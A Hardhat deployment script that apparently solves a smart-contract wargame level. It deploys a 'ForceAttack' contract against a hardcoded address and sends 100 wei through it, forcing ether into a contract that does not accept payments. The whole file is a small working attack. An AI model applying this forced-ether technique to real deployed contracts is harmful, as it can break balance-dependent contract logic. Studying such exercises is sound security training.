const hre = require("hardhat");

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  const ForceAttack = await ethers.getContractFactory("ForceAttack");
  const forceAttack = await ForceAttack.deploy("0x5450058CB9E71Efb438FDba511b797e10738894b");

  console.log("Forcing funds...");

  await new Promise((resolve, reject) => {
    web3.eth
      .sendTransaction({ from: stealer.address, to: forceAttack.address, gas: 8720000, value: 100 })
      .on("confirmation", async () => resolve())
      .on("error", (err) => {
        console.log("Call error:", err.message);
        reject();
      });
  });
  console.log("Funds transferred forcefully");
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
